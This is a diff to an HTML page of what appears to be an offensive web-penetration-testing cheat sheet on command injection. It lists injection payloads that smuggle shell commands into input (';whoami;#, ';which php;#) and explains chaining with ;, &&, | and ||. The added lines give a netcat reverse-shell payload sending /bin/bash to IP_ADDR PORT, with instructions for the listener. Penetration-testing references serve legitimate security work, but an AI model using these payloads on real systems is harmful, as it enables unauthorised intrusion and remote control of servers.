@@ -33,9 +33,10 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
 <summary>GENERAL INFORMATION</summary>
-<b>DESCRIPTION: </b>Collection of different test to confirm the vulnerability. 
+<b>DESCRIPTION: </b>Collection of different test to confirm the vulnerability, this can be reflected in browser sometimes.
 
-<b>NOTE: </b>Manual inspection is needed, source code, headers, behavior, etc. 
+<b>NOTE: </b>Manual inspection is needed, source code, headers, behavior, etc. You can use variants of symbols to pipe and
+add more commands to retrieve content. <b>[ ; or & or && and | or || ]</b>
 
 <b>C1: </b><mark id="CT01">';whoami;#</mark>
 <b>C2: </b><mark id="CT02">';which php;#</mark>
@@ -47,6 +48,14 @@
 <b>NOTE: </b>If possible, try any command to get some kind of reverse shell! For that check what technologies are present, change the 
 technology to validate. [C2]
 
+<b>::: GENERATE A SHELL</b>
+
+<b>C1:</b> <mark id="GS01">&& nc -vn IP_ADDR PORT -e /bin/bash</mark>
+
+<b>NOTE:</b> Remember to set up a listener, "<b>nc -lvp PORT</b>"
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#GS01')">.C1.</button>
+	
 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">REVERSE SHELL | (payloadallthethings)</a>
 	
 </details>	
